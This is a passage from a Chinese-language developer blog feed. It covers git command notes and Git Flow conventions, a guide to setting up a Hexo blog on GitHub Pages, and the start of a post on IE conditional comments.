class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 回退前都先查看log</span></span><br><span class="line">git <span class="built_in">log</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># reset</span></span><br><span class="line"><span class="comment"># 几个~就是回退几个版本，此处是本地回退</span></span><br><span class="line">git reset --hard HEAD~~</span><br><span class="line"><span class="comment"># 回退到上个版本</span></span><br><span class="line">git reset –hard HEAD^</span><br><span class="line"><span class="comment"># 回退到上100个版本</span></span><br><span class="line">git reset -hard HEAD~100</span><br><span class="line"></span><br><span class="line"><span class="comment"># revert</span></span><br><span class="line">git push -f origin master就是强制push到远端</span><br><span class="line"></span><br><span class="line"><span class="comment"># log和reflog的区别</span></span><br></pre></td></tr></table></figure><h4 id="Branch"><a href="#Branch" class="headerlink" title="Branch"></a>Branch</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 查看所有分支（包括远端和本地）</span></span><br><span class="line">git branch -a</span><br><span class="line"></span><br><span class="line"><span class="comment"># 查看本地分支</span></span><br><span class="line">git branch</span><br><span class="line"></span><br><span class="line"><span class="comment"># 查看所有远端分支</span></span><br><span class="line">git branch -r</span><br><span class="line"></span><br><span class="line"><span class="comment"># 查看本地已merged的分支</span></span><br><span class="line">git branch --merged</span><br><span class="line"></span><br><span class="line"><span class="comment"># 查看本地未merged的分支</span></span><br><span class="line">git branch --no-merged</span><br><span class="line"></span><br><span class="line"><span class="comment"># 新建分支，但是不切换到此分支</span></span><br><span class="line">git branch mybranch</span><br><span class="line"></span><br><span class="line"><span class="comment"># 从当前分支新建并切换到此分支</span></span><br><span class="line">git checkout -b mybranch</span><br><span class="line"></span><br><span class="line"><span class="comment"># 删除本地分支，可删除多个</span></span><br><span class="line">git branch -d mybranch1 mybranch2</span><br><span class="line"></span><br><span class="line"><span class="comment"># 强制删除本地未merge分支</span></span><br><span class="line">git branch -D mybranch</span><br><span class="line"></span><br><span class="line"><span class="comment"># 删除远端分支</span></span><br><span class="line">git push origin :mybranch</span><br><span class="line"><span class="comment"># 或</span></span><br><span class="line">git push origin --delete mybranch</span><br></pre></td></tr></table></figure><h4 id="关于删除远端分支注意："><a href="#关于删除远端分支注意：" class="headerlink" title="关于删除远端分支注意："></a>关于删除远端分支注意：</h4><p>删除远端分支后<code>另一个用户</code>并不能获取到分支被删除了,<code>git branch -r</code>也依然能获取到被删除的分支</p><p>这说明，remotes/origin/* 这些远程跟踪分支，仅仅是远程分支的一个缓存，并且，不能通过git fetch 命令获取到分支删除的更新</p><p>可以通过<code>git remote show origin</code>来查看，会列出所有分支状态</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">branchA tracked</span><br><span class="line">refs/remotes/origin/deletedBranchA stale (use <span class="string">'git remote prune'</span> to remove)</span><br><span class="line">refs/remotes/origin/deletedBranchB stale (use <span class="string">'git remote prune'</span> to remove)</span><br></pre></td></tr></table></figure><p>被删除的分支<code>refs/remotes/origin/deletedBranch</code>状态是<code>stale</code>(陈旧的)</p><p>后面有提示</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">git remote prune origin</span><br><span class="line"><span class="comment"># 或</span></span><br><span class="line">git fetch -p</span><br></pre></td></tr></table></figure><h4 id="Stash"><a href="#Stash" class="headerlink" title="Stash"></a>Stash</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 暂存</span></span><br><span class="line">git stash</span><br><span class="line"></span><br><span class="line"><span class="comment"># 列出所有暂存</span></span><br><span class="line">git stash list</span><br><span class="line"></span><br><span class="line"><span class="comment"># 列出上次暂存</span></span><br><span class="line">git stash show</span><br><span class="line"></span><br><span class="line"><span class="comment"># 恢复暂存，删除list中的</span></span><br><span class="line">git stash pop stash@&#123;0&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 只恢复暂存，list中不删除</span></span><br><span class="line">git stash apply stash@&#123;0&#125;</span><br></pre></td></tr></table></figure><h4 id="checkout"><a href="#checkout" class="headerlink" title="checkout"></a>checkout</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 在本地新建一个分支test并切换到此分支</span></span><br><span class="line">git checkout -b <span class="built_in">test</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 切换已有的远端分支或本地分支</span></span><br><span class="line">git checkout <span class="built_in">test</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 放弃工作区修改，删除的某文件</span></span><br><span class="line">git checkout -- a.js</span><br><span class="line"></span><br><span class="line"><span class="comment"># 放弃所有工作区文件的删除，修改（不影响新增）</span></span><br><span class="line">git checkout -- .</span><br></pre></td></tr></table></figure><h4 id="merge"><a href="#merge" class="headerlink" title="merge"></a>merge</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">git checkout dev</span><br><span class="line"></span><br><span class="line"><span class="comment"># 把master merge到 dev</span></span><br><span class="line">git merge origin/master</span><br><span class="line"></span><br><span class="line"><span class="comment"># 在远程仓库也新建一个分支test</span></span><br><span class="line">git push origin <span class="built_in">test</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># cherry-pick</span></span><br><span class="line">git cherry-pick commitId</span><br><span class="line"></span><br><span class="line"><span class="comment"># 和rebase的区别是？rebase的commit history会更干净一点</span></span><br><span class="line">git rebase</span><br></pre></td></tr></table></figure><h4 id="Reflog和log"><a href="#Reflog和log" class="headerlink" title="Reflog和log"></a>Reflog和log</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 只列出commit的log</span></span><br><span class="line">git <span class="built_in">log</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 列出所有操作，包括pull，checkout</span></span><br><span class="line">git reflog</span><br><span class="line"></span><br><span class="line"><span class="comment"># 查看每一行最后是谁修改的</span></span><br><span class="line">git blame file</span><br></pre></td></tr></table></figure><p>git的HEAD是当前活跃分支游标</p><p>使用小乌龟的log来查看历史</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># fetch和pull的区别，fetch不会自动merge更安全点</span></span><br><span class="line">git fetch</span><br><span class="line"><span class="comment"># 在英文状态下按Q退出日志模式</span></span><br><span class="line">git <span class="built_in">log</span></span><br><span class="line">git rm</span><br><span class="line"></span><br><span class="line"><span class="comment"># origin算是仓库名，可以命名为其他的</span></span><br><span class="line"></span><br><span class="line">git pull origin</span><br><span class="line"></span><br><span class="line"><span class="comment"># git的origin指向的是本地的代码库托管在github的版本</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 列出对应的都是仓库</span></span><br><span class="line">git remote -v</span><br><span class="line"></span><br><span class="line"><span class="comment"># git remote存在的远端分支 origin</span></span><br><span class="line"><span class="comment"># 创建多个远端仓库</span></span><br><span class="line">git remote add</span><br><span class="line"><span class="comment"># 删除远端仓库</span></span><br><span class="line">git remote rm repositoryName</span><br><span class="line"><span class="comment"># 重命名远端仓库</span></span><br><span class="line">git remote rename eva origin</span><br><span class="line"><span class="comment"># 在本地仓库添加一个远程仓库，并将master跟踪到远程分支</span></span><br><span class="line">git remote add https://github.com/EvaLotus/test.git</span><br><span class="line"><span class="comment"># 把我的分支push到远端哪个分支上</span></span><br><span class="line">git push origin mybranch:master</span><br><span class="line">git push origin mybranch:staging</span><br><span class="line"></span><br><span class="line"><span class="comment"># 带*的表示当前分支</span></span><br><span class="line"><span class="comment"># 回退到merge前</span></span><br><span class="line">git reset --merge</span><br></pre></td></tr></table></figure><ul><li>sourceTree请使用英文版的，不然太难用啦！！</li></ul><h4 id="gitlab中的权限管理"><a href="#gitlab中的权限管理" class="headerlink" title="gitlab中的权限管理"></a>gitlab中的权限管理</h4><p>只有owner在setting里可以邀请member，给member设置master的权限，否则是protected状态</p><p>gitlab网站上发出merge request</p><h4 id="svn和git的区别"><a href="#svn和git的区别" class="headerlink" title="svn和git的区别"></a>svn和git的区别</h4><ul><li><p>SVN是集中式版本控制系统，版本库是集中放在中央服务器的，而干活的时候，用的都是自己的电脑，所以首先要从中央服务器哪里得到最新的版本，然后干活，干完后，需要把自己做完的活推送到中央服务器。集中式版本控制系统是必须联网才能工作，如果在局域网还可以，带宽够大，速度够快，如果在互联网下，如果网速慢的话，就纳闷了。</p></li><li><p>Git是分布式版本控制系统，那么它就没有中央服务器，每个人的电脑就是一个完整的版本库，这样，工作的时候就不需要联网了，因为版本都是在自己的电脑上。既然每个人的电脑都有一个完整的版本库，那多个人如何协作呢？比如说自己在电脑上改了文件A，其他人也在电脑上改了文件A，这时，你们两之间只需把各自的修改推送给对方，就可以互相看到对方的修改了。</p></li></ul><h4 id="基于-Git-Flow-的开发流程"><a href="#基于-Git-Flow-的开发流程" class="headerlink" title="基于 Git Flow 的开发流程"></a>基于 Git Flow 的开发流程</h4><h4 id="Git-Flow-分支模型"><a href="#Git-Flow-分支模型" class="headerlink" title="Git Flow 分支模型"></a>Git Flow 分支模型</h4><ul><li>master 分支 =&gt; 正式环境（最为稳定功能最为完整）</li><li>test 分支（release分支） =&gt; 测试环境（发布定期要上线的功能）</li><li>dev 分支 =&gt; 团队协作的发开环境（功能最新最全的分支）</li><li>hotfix 分支 =&gt; 修复线上代码的 bug</li><li>feature分支 =&gt; 某个功能点正在开发阶段</li><li><h4 id="开发阶段"><a href="#开发阶段" class="headerlink" title="开发阶段"></a>开发阶段</h4></li><li><p>开发 on your branch</p></li><li><p>gitlab上发起merge request</p></li><li><p>code review，accept merge request，delete branch</p></li></ul><h4 id="测试阶段"><a href="#测试阶段" class="headerlink" title="测试阶段"></a>测试阶段</h4><ol><li>完成新功能后，dev 分支提交到 test 分支（release分支），进行测试</li><li>有bug：创建hotfix 分支（修复后合并到 test 分支）</li></ol><h4 id="发布上线"><a href="#发布上线" class="headerlink" title="发布上线"></a>发布上线</h4><ol><li>release 分支合并进 master 和 develop</li><li>上线</li><li>线上环境小 bug：创建 hotfix 分支进行修改，大bug：版本回滚</li></ol><h4 id="分支命名"><a href="#分支命名" class="headerlink" title="分支命名"></a>分支命名</h4><p>参考：</p><ul><li>feature——按照功能点（而不是需求）命名；</li><li>test(release)——用发布时间命名，可以加上适当的前缀；</li><li>hotfix——GitLab 的 issue 编号或 bug 性质等。</li></ul><h4 id="Commit-Message格式"><a href="#Commit-Message格式" class="headerlink" title="Commit Message格式"></a>Commit Message格式</h4><p>star多的项目都有完善的文档体系和高覆盖的测试用例</p><h4 id="type"><a href="#type" class="headerlink" title="type"></a>type</h4><ul><li><p>feat：新功能（feature）</p></li><li><p>fix：修补bug</p></li><li><p>docs：文档（documentation）</p></li><li><p>style： 格式（不影响代码运行的变动）</p></li><li><p>refactor：重构（即不是新增功能，也不是修改bug的代码变动）</p></li><li><p>test：增加测试</p></li><li><p>chore：构建过程或辅助工具的变动</p></li></ul><h4 id="Scope"><a href="#Scope" class="headerlink" title="Scope"></a>Scope</h4><p>用来说明本次Commit影响的范围，即简要说明修改会涉及的部分。这个本来是选填项，但从AngularJS实际项目中可以看出基本上也成了必填项了。</p><p>用来简要描述本次改动，概述就好了，因为后面还会在Body里给出具体信息。并且最好遵循下面三条:</p><h4 id="Subject"><a href="#Subject" class="headerlink" title="Subject"></a>Subject</h4><ul><li><p>以动词开头，使用第一人称现在时，比如change，而不是changed或changes</p></li><li><p>首字母不要大写</p></li><li><p>结尾不用句号(.)</p></li></ul><h4 id="Body"><a href="#Body" class="headerlink" title="Body"></a>Body</h4><p>&lt;body&gt;里的内容是对上面subject里内容的展开，在此做更加详尽的描述，内容里应该包含修改动机和修改前后的对比。</p><h4 id="Revert"><a href="#Revert" class="headerlink" title="Revert"></a>Revert</h4><p>此外如果需要撤销之前的Commit，那么本次Commit Message中必须以revert：开头，后面紧跟前面描述的Header部分，格式不变。并且，Body部分的格式也是固定的，必须要记录撤销前Commit的SHA值。</p><p>git pull = git fetch +git merge</p><p>在git merge时会自动生成个merge的时间节点在commit记录里</p><h4 id="rebase和merge"><a href="#rebase和merge" class="headerlink" title="rebase和merge"></a>rebase和merge</h4><p>两者都是用来合并分支，细节处理上有些不一样</p><p>[rebase](<a href="https://mp.weixin.qq.com/s?__biz=MzAwNDYwNzU2MQ==&amp;mid=400938481&amp;idx=1&amp;sn=f4d92674ebf00c0a208936e6467c3da1&amp;scene=21#wechat_redirect%29" target="_blank" rel="noopener">https://mp.weixin.qq.com/s?__biz=MzAwNDYwNzU2MQ==∣=400938481&amp;idx=1&amp;sn=f4d92674ebf00c0a208936e6467c3da1&amp;scene=21#wechat_redirect\</a></p><h4 id="git-hook自动部署"><a href="#git-hook自动部署" class="headerlink" title="git hook自动部署"></a>git hook自动部署</h4><p>ssh <a href="mailto:git@gitlab.com" target="_blank" rel="noopener">git@gitlab.com</a> -T</p><h4 id="git迁移"><a href="#git迁移" class="headerlink" title="git迁移"></a>git迁移</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">git checkout master</span><br><span class="line">git pull origin master --all</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> branch <span class="keyword">in</span> `git branch -a | grep remotes | grep -v HEAD | grep -v master `; <span class="keyword">do</span></span><br><span class="line">git branch --track <span class="variable">$&#123;branch#remotes/origin/&#125;</span> <span class="variable">$branch</span></span><br><span class="line"><span class="keyword">done</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">export</span> new_repo=<span class="variable">$1</span></span><br><span class="line">git remote <span class="built_in">set</span>-url origin <span class="variable">$new_repo</span></span><br><span class="line">git remote <span class="built_in">set</span>-url --push origin <span class="variable">$new_repo</span></span><br><span class="line">git remote -v</span><br><span class="line">git push -u origin --all</span><br><span class="line">git push -u origin --tags</span><br></pre></td></tr></table></figure><h4 id="TODO概念解析"><a href="#TODO概念解析" class="headerlink" title="TODO概念解析"></a>TODO概念解析</h4><p>一些blob，tree，commit对象的内部概念</p><p>.git文件夹下的内容</p><p>git merge origin/other_branch时有时会自动merge<br>可以故意commit一个有冲突的再merge就可以显示merge的全部内容了</p><p>WIP：在进行中，避免被merge</p><p>git rebase</p><p>git cherry-pick</p><h4 id="HEAD"><a href="#HEAD" class="headerlink" title="HEAD"></a>HEAD</h4><p>可以看到<code>.git/HEAD</code>中内容</p><p>当在master分支时，内容为<code>ref: refs/heads/master</code></p><p>当在master分支时，内容为<code>ref: refs/heads/master</code></p>]]></content>
      
      
      
        <tags>
            
            <tag> Tool </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>hexo+github pages 搭建 blog及防坑指南</title>
      <link href="/2016/12/18/hexo/"/>
      <url>/2016/12/18/hexo/</url>
      
        <content type="html"><![CDATA[<p>在超哥的安利下，开始使用hexo+githubpages搭建自己的博客。对于前端同学来说，基于Node.js的hexo可谓是非常友好的选择。</p><p>前两天超哥很开心的敲下<code>hexo d</code>，过了两天整理文件时一不小心手贱删掉了项目，写了4年的博客全都没有啦，只能一个个copy出来，简直是喜闻乐见（超哥不要打我，逃～）</p><a id="more"></a><p>基本操作大家都可以在hexo详尽的文档中找到，但是一些文档之外的最佳实践，在此记录下。</p><h4 id="基本搭建操作"><a href="#基本搭建操作" class="headerlink" title="基本搭建操作"></a>基本搭建操作</h4><p>以下是搭建hexo博客基本操作，只是mark一下</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 安装hexo命令行工具</span></span><br><span class="line">nmp i hexo-cli -g</span><br><span class="line"></span><br><span class="line"><span class="comment"># 在此目录搭建博客，在github创建此项目</span></span><br><span class="line"><span class="built_in">cd</span> EvaLotus.github.io</span><br><span class="line"><span class="comment"># 新搭建的blog需要这一行</span></span><br><span class="line">hexo init</span><br><span class="line"><span class="comment"># 安装依赖</span></span><br><span class="line">npm install</span><br><span class="line"></span><br><span class="line"><span class="comment"># 启动服务，一个基本的博客就已经搭建好了</span></span><br><span class="line">hexo s</span><br><span class="line"></span><br><span class="line"><span class="comment"># 选择喜欢的主题，如next，实在是太容易撞衫了，但是确实是极简主义的爱</span></span><br><span class="line"><span class="comment"># 将主题clone至themes目录下</span></span><br><span class="line"><span class="comment"># 每次换电脑重新clone项目都需要执行这一步哦</span></span><br><span class="line">git <span class="built_in">clone</span> https://github.com/theme-next/hexo-theme-next themes/next</span><br><span class="line"></span><br><span class="line"><span class="comment"># 在外层_confif.yml中改theme为next</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 删除generate的文件，切换主题时最好执行下，可以不用自己删掉public文件</span></span><br><span class="line">hexo clean****</span><br><span class="line"></span><br><span class="line"><span class="comment"># 生成public目录，可以在本地调试时使用</span></span><br><span class="line">hexo g</span><br><span class="line"></span><br><span class="line"><span class="comment"># 如果只是直接部署</span></span><br><span class="line">hexo d</span><br><span class="line"></span><br><span class="line"><span class="comment"># 新建一篇博客</span></span><br><span class="line">hexo new <span class="string">'HelloWorld'</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 豆瓣相关</span></span><br><span class="line">hexo douban -b  <span class="comment">#生成读书页面</span></span><br><span class="line">hexo douban -m  <span class="comment">#生成电影页面</span></span><br><span class="line">hexo douban -g  <span class="comment">#生成游戏页面</span></span><br></pre></td></tr></table></figure><p>很容易就搭建好了自己的博客，下面是一些常见问题的解决。</p><h4 id="FAQ"><a href="#FAQ" class="headerlink" title="FAQ"></a>FAQ</h4><p><strong>1.怎么能将github.io的域名改成自己申请的域名？</strong></p><p>首先你需要在万网或其他平台上买个域名，一般50元/年。购买完成后需要在购买域名的管理后台进行CNAME解析，目的是将gitubpages的地址比如<code>https://github.com/EvaLotus/EvaLotus.github.io</code>指向你购买的域名<code>evacoder.com</code>。<br>然后直接在github的project settings里，设置custom domain，这样就会自动在你的项目中增加一个CNAME文件，里面会记录你自己的域名。</p><p><strong>2.如何<code>hexo d</code>自动更新部署博客</strong></p><p>需要安装插件<code>npm i hexo-deployer-git --save</code>，在<code>_config.yml</code>中配置</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Deployment</span></span><br><span class="line"><span class="comment">## Docs: https://hexo.io/docs/deployment.html</span></span><br><span class="line">deploy:</span><br><span class="line"><span class="built_in">type</span>: git</span><br><span class="line">repo: git@github.com:EvaLotus/EvaLotus.github.io.git</span><br><span class="line">branch: master</span><br></pre></td></tr></table></figure><p>配置完成之后，每次<code>hexo d</code>都会自动将编译好的文件提交到master分支上，并部署完成。</p><p>还需要在配置_config.yml时一定要注意此类文件对缩进要求很严格，在sublime中编辑会有适当的颜色提醒你是否缩进正确。</p><p><strong>3.每次<code>hexo d</code>之后我的CNAME都没了怎么办？</strong></p><p>小伙伴们应该都发现了，<code>hexo d</code>之后并没有push source目录，只是push生成后的public中的文件，所以我们要注意，CNAME，README，Favicon.ico都应该放在source目录下，这样<code>hexo d</code>之后会直接copy到public的根目录下</p><p><strong>4.换电脑了或者像超哥那样误删了源文件怎么办？</strong></p><p>很多小伙伴应该都有同时在公司和在家修改博客的需求，一换电脑就懵逼，github上新clone下来的只有编译后的文件。</p><p>或者很久不写博客，整理文件时一不小心把源文件删掉了。</p><p>其实我们可以使用<strong>分支来管理我们的博客</strong>，简言之，master上存放生成的静态文件，hexo存放源文件。</p><p>操作之前我们要分清职责，既然hexo上只存放源文件，那么我们要配置合理的<code>.gitignore</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">.DS_Store</span><br><span class="line">Thumbs.db</span><br><span class="line">db.json</span><br><span class="line">*.log</span><br><span class="line">node_modules/</span><br><span class="line">.deploy*/</span><br><span class="line"># public和themes文件在hexo分支上都应该不应该被提交，因为是我们自己写的</span><br><span class="line"># 但是themes中的_confif.yml我们需要copy一份在source目录下备用，以免换电脑之后丢失</span><br><span class="line"># 合理的管理分支和文件，不要给自己埋坑</span><br><span class="line">public/</span><br><span class="line">themes/</span><br></pre></td></tr></table></figure><p>操作上并不需要切换分支，按下面的步骤配置之后，每次操作都在hexo分支上修改，不用再管master分支了。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 切出hexo分支</span></span><br><span class="line">git checkout -b hexo</span><br><span class="line"></span><br><span class="line"><span class="comment"># 以后都在此分支上修改，虽然hexo d可以帮你将生成的静态文件自动push到master</span></span><br><span class="line">git checkout master</span><br><span class="line">hexo d</span><br><span class="line"></span><br><span class="line"><span class="comment"># 但是每次修改之后一定要记得自己把hexo分支上的源文件的修改push一下！！</span></span><br><span class="line">git push origin/hexo</span><br><span class="line"></span><br><span class="line"><span class="comment"># Easy!</span></span><br><span class="line"><span class="comment"># 这样换电脑之后直接很快就可以获取到博客源文件了</span></span><br><span class="line">git <span class="built_in">clone</span> git@github.com:EvaLotus/EvaLotus.github.io.git</span><br><span class="line">git checkout hexo</span><br><span class="line">npm install</span><br><span class="line"><span class="comment"># 因为theme文件在gitignore下，所以每次还需要重新clone下，不然会遇到no layout的错误。</span></span><br><span class="line"><span class="comment"># 把source中的_confif.theme.yml copy回来</span></span><br><span class="line">git <span class="built_in">clone</span> https://github.com/theme-next/hexo-theme-next themes/next</span><br></pre></td></tr></table></figure><p>我的博客可能不是最好看的，但是一定是目录结构最清爽的！</p><p><strong>5.怎么维护博客呢？</strong><br>我之前都是在gitbook上做学习笔记，语言很随意，排版很混乱，这样并不利于知识的沉淀，不仅仅要自己理解，更要能陈述的让其他人一看就明白，像阮一峰老师那样，由浅入深，把复杂的只是说清楚。</p><p>现在把gitbook的笔记都整理成博客之后，也不敢把gitbook的笔记删掉，一旦遇到维护两份差不多的文档时，我们就要警惕，他们一定会差别越来越大，最后有一份会被放弃，要不然就是要花更多的时间来整理。</p><p>既然写blog可以让我们知识沉淀更深，那么就写在博客上吧。</p><p>但是直接在sublime中写markdown并不能所见即所得，我想到的办法是在gitbook中直接打开博客的source目录，这样既能所见即所得，又保持了唯一性，之后会把gitbook上零碎的知识整理成每个人都能看懂的文章。</p><p><strong>6.分享愉快的写博客体验</strong><br>在<code>hexo s</code>状态下我们修改了markdown之后，只需要刷新页面就可以看到变化了。如何实现自动刷新可以使用webpack的loader，但是暂时不想实现本地的chrome+sublime插件livereload也可以实现这个功能。<br>hexo使用的是gulp，gulp也有<a href="https://www.npmjs.com/package/gulp-livereload" target="_blank" rel="noopener">gulp-livereload</a>可以使用，感兴趣的小伙伴可以改下试试。</p><p>其他问题可以直接去看<a href="https://hexo.io/zh-cn/docs/index.html" target="_blank" rel="noopener">hexo的文档</a>，已经灰常良心了！</p><p>搭建博客很简单，有很多漂亮的主题可供大家选择，但是博客的壳子并没有那么重要，最重要的是保持每天记录的习惯，分享高质量的内容。</p><p>如果遇到其他问题可以给我留言，一起来搭建自己的博客吧。</p>]]></content>
      
      
      
        <tags>
            
            <tag> blog </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>HTML条件注释</title>
      <link href="/2016/12/10/html_if_annotate/"/>
      <url>/2016/12/10/html_if_annotate/</url>
      
        <content type="html"><![CDATA[<p>在ie8-下不加入某个功能，回想起那个遥远的年代，初次见到是在Bootstrap中，低版本ie需要加载html5shiv，用到了条件注释。<br>希望幸福的你们都不需要用到~</p><a id="more"></a><p>在ie8-就不要加载某个js，通过条件注释即可实现</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!--[if !IE]&gt; 除IE外都可识别 &lt;![endif]--&gt;</span></span><br><span class="line"><span class="comment">&lt;!--[if IE]&gt; 所有的IE可识别 &lt;![endif]--&gt;</span></span><br><span class="line"><span class="comment">&lt;!--[if IE 8]&gt; 仅IE8可识别 &lt;![endif]--&gt;</span></span><br><span class="line"><span class="comment">&lt;!--[if lt IE 6]&gt; IE6以及IE6以下（&lt;）版本可识别 &lt;![endif]--&gt;</span></span><br><span class="line"><span class="comment">&lt;!--[if lte IE 7]&gt; IE7以及IE7以下（&lt;=）版本可识别 &lt;![endif]--&gt;</span></span><br><span class="line"><span class="comment">&lt;!--[if gt IE 7]&gt; IE7以及IE7以上（&gt;）版本可识别 &lt;![endif]--&gt;</span></span><br><span class="line"><span class="comment">&lt;!--[if gte IE 6]&gt; IE6以及IE6（&gt;=）以上版本可识别 &lt;![endif]--&gt;</span></span><br></pre></td></tr></table></figure><p>其实此标签是IE提供的，只有IE可以识别，所以在其他的浏览器中会被当做注释忽略掉。<br>IE10 之后不再支持条件注释，也就是说就会被当成一个普通的注释忽略掉。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- 